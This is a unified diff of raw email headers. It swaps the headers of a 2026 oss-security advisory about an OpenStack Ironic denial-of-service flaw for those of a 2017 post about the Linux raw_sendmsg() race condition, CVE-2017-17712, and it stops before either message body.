@@ -1,4 +1,9 @@
-Received: (qmail 3483 invoked by uid 550); 19 May 2026 21:25:30 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["31266" "Saturday" "16" "December" "2017" "00:29:09" "+0000" "Mohamed Ghannam" "simo.ghannam@gmail.com" "<CAP8jf_BKWuYGsqrNUCbJgCFUJv0nJvp+eiKEy3Ati0FYaCED0Q@mail.gmail.com>" "562" "[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition" "^Date:" nil nil "12" "2017121600:29:09" "[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition" (number mark "U       simo.ghannam Dec 16  562/31266 " thread-indent "\"[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 18225 invoked by uid 550); 16 Dec 2017 02:24:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,404 +11,600 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 1403 invoked from network); 16 Dec 2017 00:29:23 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=LEiiEBgmilFrBSm/sZPZ84sXIqlreOY9OHDx1U9SZHQ=;
+        b=XNgvd8HAkg2x/a/Paq9WwydyZJMAtuhpvPwrX1nmO/IeIiLsDgxli7qbq44X5pGWdP
+         YRKicmssbiYYgl2q5zCDtOhSzcrZWkHFa44JG8gQSIuRbILpyVHtu7O2FoCOMbhoNFSQ
+         BsXpKlxnBH2iR2PM7IwK1316XBOb5l7eyX5jU3rf0nEhfvCvyNhKWgJ0aFimYabfb4bW
+         zSHNB+HHdVsxXBiHBrzSj43ICmTkOKFdoZ1eEIEbjKgv7YSzw1XGEiTWn5ZDXAIgR7ez
+         dbUZfIHb0W7SYD/yx5IxgG8b8l5f1xYPfcBl1+CPMr9KQee04555xjTgBtOc692lmdha
+         3pmg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=LEiiEBgmilFrBSm/sZPZ84sXIqlreOY9OHDx1U9SZHQ=;
+        b=CqC8JoQtYQNGyTfYUxA1NZJ6JPLOV927oNPh29XTCiI+wtE59GSztpdZ/VnvcLVweN
+         CpoTpnxXMucVN8n/kG/LQusvP3L1uMUKT9P1AuUvDMw7i10k1S8SsQAavfKz0x/dwD/4
+         8tyH9GqWEry0l2V7HY3NyzMIpEJMlfAW8BTCDNIJpjDDEjT3Nu2dmSy0J5SGMZvvFVnU
+         OSD96tbNeyRALqDj4qcB1LBzwVM1uqYO3qHG59ZL5ze+cJCOX4wGdPR2gmWQhpDmEfY3
+         gC5XoVsl44OQQ0zdccfmbmoX3oJBVYYod0zz8nk7iN8XIaAJnNvCkCoCYxVSnCPDLLit
+         QoUg==
+X-Gm-Message-State: AKGB3mLWeptT9mHZxr0Pva4Xy/dqpgAGaeRVf5xaFupqLSVZJbinVn0N
+	iE0EXT5NPg1DpVz2AW6emfzddCZ3nM+0w4l16uUQ9MIs
+X-Google-Smtp-Source: ACJfBovubxdPt0tcxoS2bSEbQFOmDhQeiisu9LrSk3Wg4YYJQ2irK4Avri5wy2PjmC0N3f6v+CdO/bJ4jg5C0dt/B/o=
+X-Received: by 10.55.98.134 with SMTP id w128mr23055989qkb.292.1513384150791;
+ Fri, 15 Dec 2017 16:29:10 -0800 (PST)
+MIME-Version: 1.0
+Message-ID: <CAP8jf_BKWuYGsqrNUCbJgCFUJv0nJvp+eiKEy3Ati0FYaCED0Q@mail.gmail.com>
+Content-Type: multipart/mixed; boundary="001a11482b1cb7a18005606a34df"
+Date: Sat, 16 Dec 2017 00:29:09 +0000
+From: Mohamed Ghannam <simo.ghannam@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 18291 invoked from network); 19 May 2026 20:10:33 -0000
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=PjHPJ2zDsnoRuhfCZ9vZXS9hjm4UK1YYmKQie5FgR78/RqXpUynfDlVobWe3/wAd5uwhE8mFv3atCXsS2QMvb92+9bqivuBET08zkCeMZOqli+isWczngrGZiqozyuZCFl2U8LZ7OKBHRpI1LGj1HAl25bwRcIVI94pdxnPNLyQC1bH1ewFd35L/IBlPv4G3sBhZCOUJfBpSfZY/8JaPQq0K5PeWw1uXWrmKS4rkM7lAdvH8mswjsTeyyWYeDWPyqh2fKhIcazktN3A+aGS3d+tFhV3cxLz71sznH2qTfzmddXiHK2ohr3fByU9mu+EXS+sFiaBV4Ine62RoK3BuHg==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=y8sFtJycfhtY/N0NNcjRcjNCON9VB1U1WEPICe9lxWA=;
- b=jvgV/8gz5pRXAJUcoL616OgmJdDYfLGZY+6o6GrNUsQGfArqd/ulwbNGIPdoelVyLljpz2FI+tmijt7KcePx7nasE4H930jDqKZt/HBCtPUUCYwsT7eLmlWtIIYQ6DXGrLUSvW2gYQYgYHpsLNcME+7+Od5/to2c7vhKjyCs8CDTBTbPJdaX4y/NiQXgYrDrRB57yLvD6+xqXfD5yYJwFyB8nTmZBvYbyNP4Wl8HoQya5eIbXc852ZnHHt3nV754ak7PNnN1So1968otWj+T1HYtRiab2DTjpQxwY0kC2frBRI65F40d9HflK63KeoI8ePMe3YSiBo0/4pR/pfvNKA==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=jvf.cc; dmarc=pass action=none header.from=jvf.cc; dkim=pass
- header.d=jvf.cc; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jvf.onmicrosoft.com;
- s=selector2-jvf-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=y8sFtJycfhtY/N0NNcjRcjNCON9VB1U1WEPICe9lxWA=;
- b=I9oZphvR0tL8Gt4VGPcB5sDHUXcBw5yBWhvDifjLKgBhJZ6vaY/kLVxRSV26JEIZptAtEmrAzLyTWcRwW5DHZ3nIzKPWa/MVn5LrrxfZWVKybiEIbepexFFbD/8CJ9Cw+5UdKXRpxDhf2FGP/5IckyKOOFNtUTa796lgEvEZors=
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=jvf.cc;
-Message-ID: <95422885-0743-44d4-b7e8-cd5822e4ccba@jvf.cc>
-Date: Tue, 19 May 2026 13:10:18 -0700
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-From: Jay Faulkner <jay@jvf.cc>
-Autocrypt: addr=jay@jvf.cc; keydata=
- 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
+Subject: [oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition
 To: oss-security@lists.openwall.com
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="------------wwdiMQTg03hycGWs0hrti9HK"
-X-ClientProxiedBy: MW4PR03CA0330.namprd03.prod.outlook.com
- (2603:10b6:303:dd::35) To CO6PR19MB5340.namprd19.prod.outlook.com
- (2603:10b6:303:137::10)
-MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: CO6PR19MB5340:EE_|SA1PR19MB8828:EE_
-X-MS-Office365-Filtering-Correlation-Id: f3a96fff-e154-456f-4886-08deb5e2a69a
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|19092799006|366016|6049299003|10070799003|376014|1800799024|4053099003|18002099003|56012099003|4133799003;
-X-Microsoft-Antispam-Message-Info:
-	gQwbaiSbu2Br4GVhs5GDqiYbJLT+FW7ut7HdeW5jeXDS5RtCf1HhRHJQ1yz9rnZaodQMBJRBZZBtJC9oJv9VpVE6OLCIWZvDmMxAUDqEBWHzdN/0ws/Nu6LnLCgVCwz4CR1PwZJ9fGiQEedX7OjKPvfGfsOcVmFT7gVk2dgd5CL970b6mo7/cqVg4P0kqP1K3Z0d/QxBBzqaXhBOlG/v9UU+o57Nkldm95NBP67rHDPg9EA0t7XAbUHlB0TVL37QPngkNn9dxODVruFhQvucw/JQa3ZbYupVt8sl0B8xuv94gfAp5W56v8ic3ebGzBzRKSxlKA0/GynksunmaMfzV1iA5neAxiD+s8Tjj+VMKfLKGxc1iLW7RCNGNDaWTiAKgtpP6Eo0BA7ot2CudpGVRuEhxQ5KhJi51E3RhsIbzgR4Hirvgxlm4EPtP5qm9XU3+KsT/o35915wrRabHFjXxI/X7PgLI5EHv5KF1ySW7mxl65iRJ3elL5hdxtQ7VUXo3oD5E28KlCWU/gKacYlkHTtSnuc1H0b7m0D4kg0+oPlCYB1uShnZB+NVejQq8DWJ3gEJbX5MSkao/RE/irQZxD/7rblmqNJRRZsmjJZgvyBtAhlypZO6yZinVBy+juWhYtQxwI1wzDA7/boTodtC5w==
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CO6PR19MB5340.namprd19.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(19092799006)(366016)(6049299003)(10070799003)(376014)(1800799024)(4053099003)(18002099003)(56012099003)(4133799003);DIR:OUT;SFP:1102;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?ZWxZRm9NZm9GQ0V0OW1aZ2E4OVlLNUN0cnF0RTZmOEN2eFZOcnV6YzB0dGEz?=
- =?utf-8?B?STJmWEd5ZDlaSG1JS01TOUFZUHhrdGZMZlo2blUvM09rMHVrUUxYWElNdndl?=
- =?utf-8?B?RXg3c29zTXFrZWJ2aG1EQk5sd3RiVUpORHJMaTZ2SUF6KzZUeGdhbUtXRTNF?=
- =?utf-8?B?aEo3Y1V0Nm5QRTVEMGVveFZ1TG1MS3d4ZWV0a2VITzJhYTBuSzRTMllaekkv?=
- =?utf-8?B?aHRwY1hMMHl4RDdrWGNSanVQdlVPVFBrOTd0V3NFdndoVDVWck5adUU5OTdt?=
- =?utf-8?B?SXg1MVFCSXRqYVlkbmpWUGd2UVJ1V2Y2SEx4bFBoQTNLbjRsSDlFdnQrampW?=
- =?utf-8?B?clcxQzEwUTFteDk2Q2sxQTVaOU9SUlhGbUZidGdFVTBVS3BzdEordmFXSlFB?=
- =?utf-8?B?dHplS0MzQTR6dkpweEo0RWNUd0NGbk1tSTdkU016UzVuVE1DOWZYakIrRkxa?=
- =?utf-8?B?WHdhSklSZ0tZMU9ZMHAxWDFLSmhtMXVjdGxrclhCZEdLS1FSZHpCTXA3WjlT?=
- =?utf-8?B?M1BEdlNUVE0xWWlucUtWNk1yK09vZzl5aXpHUkEybUszbE9zS1FuQWVDdSt4?=
- =?utf-8?B?S3UvQmtwRVhnK0xyVnZoVzBQV1Vqbit3MG5HMFNkT2NBV0VDeUwra3FZUFVH?=
- =?utf-8?B?TysxNmFSSmpScGpLdCtlaCtRb3p3UlpZYXBIOFBYRDV0a21JU0ZWYm5ZTGNx?=
- =?utf-8?B?ajNkRkYxSzBJODZnNXQrejM4WG1JRWJwS1NFdDFNNDB3QjhyM1h1SGhLbHlk?=
- =?utf-8?B?bGtleStqb1Awb1hvMjlIZ2FRWVdhdEgxaENLU2pweHRTSytTY2drNmFKcHdF?=
- =?utf-8?B?N2pNcGpTZlRNeDJwVmdVb2RIcGFUMkhIcWl5TEE2S3lZZkdqMng3UTBRcFRy?=
- =?utf-8?B?VTFrV09aeFVLaVQ4TVkzN1IyR2xvVFVoNkZpQUVjVHh1Zitoa2d6bDY5Slcz?=
- =?utf-8?B?UVNMc3o4S3U2dW5aZFNHQWErU0I2eWJIZ1JWS0c5WXRHSW9qZ2xhdlMra0ox?=
- =?utf-8?B?R2V1cSsydXEveXYxM3JWeWVHSkRlSm43Q0R2R3dFQitDNnJueWtDemhSOFcv?=
- =?utf-8?B?cWpoNDZMalVPakFpZ3ZjSFQwZVVLaXY1cEVKK3ZPZDVhM2JKRGQ2N1p6b2Nq?=
- =?utf-8?B?ZW5QVWtDN25PQjB5dWhXaHBxNElxUWZVK05jSFJKSzZLSDBkQ3dIOHBVRllm?=
- =?utf-8?B?c2REUys5R2wvQ2RiUk92UThScWxpN2dTSXpmU0UybUFqWjRKaFZob21xTkhj?=
- =?utf-8?B?RU1CQWtSTFZiYkR4ZlRJZk0yeklrU3VGVnIyVFZJZC9YaEJ2MStEdzFtbkY3?=
- =?utf-8?B?elEwNGZycy9TM2N6Umtzek5UUHB2YjIzclc5enl2cmFLaFZlaFF1aFhZWGRw?=
- =?utf-8?B?Y2RXZ3phbFJiTmRTbkxzZU5CRFpHaHFKZ3RBOEpMOVFDcHBneTVvMWNPR2pa?=
- =?utf-8?B?eGRLSS82K0ZkaVhqSzZ6MFYycndPdXVzR1ZKN2J6K0UzWGY2bHp3K09xL0Na?=
- =?utf-8?B?YnFSMzQ3VnBGNklMWHZsSGJJSEdjTE85cXpObEkwcFJlcGdsdlRLTTRzK2NC?=
- =?utf-8?B?NHk2di9CTGxJeWxMTU5qRjk1RTJlUHNQbTFadFUzalZkRnVsZU44NmNBSUI3?=
- =?utf-8?B?S0NXaStzZkxiYUQzQ2xRWWcveFd5Vlg1amR2b000bnN2WnRGRUJPbDRoc3dr?=
- =?utf-8?B?WjV3MXZ3VU5RSDFJZitPc0pwaStGRHBpNCt2L2twbGJkSGpUcVZ1MFZTN2Q3?=
- =?utf-8?B?NU9zdDN1aklVVnRSN1Y3VHd0b0lOMFJsRWxub1BNZFhSbXo2eXkvK2k1WWVT?=
- =?utf-8?B?SzdLRGt4d0EzeTV0NmptZ0JaYk9CeVovanRiTi9MTkNidXJVWXdxTVR5S0tq?=
- =?utf-8?B?dEtJaXBPczJkbDljZWZHaGZiUm1sYXlxb3Y3ODFTWlJvU1F6UTFlOCtqRElC?=
- =?utf-8?B?QkJNaXlqVFVXdUNlbXRGL1RpQTEvOE9XZ1lzZE5rcEc4OHZNdmFPMFFOSUVn?=
- =?utf-8?B?ZTBOUVMzUVRVYmlmRnNmaWxXZE1QVE1lZnNBd0JKQlhETUNMSkJCQ1ZjeWVR?=
- =?utf-8?B?dXppZklXODJXZ0VuVnJUTmFacklCcFN5NUhDZmJ2SHZQQ0pSbFY2RVdQejlT?=
- =?utf-8?B?L1hKR0JVcSs3NmhEUmdzQmQwT1ZOOW1ONXdKMUxMSkdtWG1ZOHNTeWs2UVBo?=
- =?utf-8?B?SjFxVHZIR2R5Mk9VekRNZzNPa3lKUkxEU2dMVVBVUUE1VGcwcDdmSTIyRDUx?=
- =?utf-8?B?alpsNzRXc1cvNlFRQkg5T2FMdTVKaTZXNDlnOXdhdGhQSEl1M0ViN21qK3N3?=
- =?utf-8?B?R0hzZGFPS1BLTTBwbWlGMHpyY09UdHNRT0tCUENjRkNwZVMySzdQY04zRk9o?=
- =?utf-8?Q?8/Ia1CR+h2VMxNnGCFSTKxhtdfkC8eJEGoB6G?=
-X-OriginatorOrg: jvf.cc
-X-MS-Exchange-CrossTenant-Network-Message-Id: f3a96fff-e154-456f-4886-08deb5e2a69a
-X-MS-Exchange-CrossTenant-AuthSource: CO6PR19MB5340.namprd19.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 19 May 2026 20:10:19.9121
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 3268b97a-2d09-45a8-9816-8dea1f44039e
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: 9z1ILdcA2p7aksEuf/FE/tbXmyUsUhq6lN6IuFuNedZQ9M02PDvX+SUQsjfB85kP
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: SA1PR19MB8828
-Subject: [oss-security] [OSSA-2026-013] Ironic: Denial of Service via specially crafted
- deployment requests (CVE-2026-44919)
 
---------------wwdiMQTg03hycGWs0hrti9HK
-Content-Type: multipart/mixed; boundary="------------2zg00N570Xzsf6mx1Sy0WZ8W";
- protected-headers="v1"; hp="clear"
-Message-ID: <95422885-0743-44d4-b7e8-cd5822e4ccba@jvf.cc>
-Date: Tue, 19 May 2026 13:10:18 -0700
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-From: Jay Faulkner <jay@jvf.cc>
-Autocrypt: addr=jay@jvf.cc; keydata=
- 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
-To: oss-security@lists.openwall.com
-Subject: [OSSA-2026-013] Ironic: Denial of Service via specially crafted
- deployment requests (CVE-2026-44919)
+--001a11482b1cb7a18005606a34df
+Content-Type: multipart/alternative; boundary="001a11482b1cb7a17d05606a34dd"
 
---------------2zg00N570Xzsf6mx1Sy0WZ8W
-Content-Type: multipart/mixed; boundary="------------UdYHE8FCvh2o0u30oQn1rZ23"
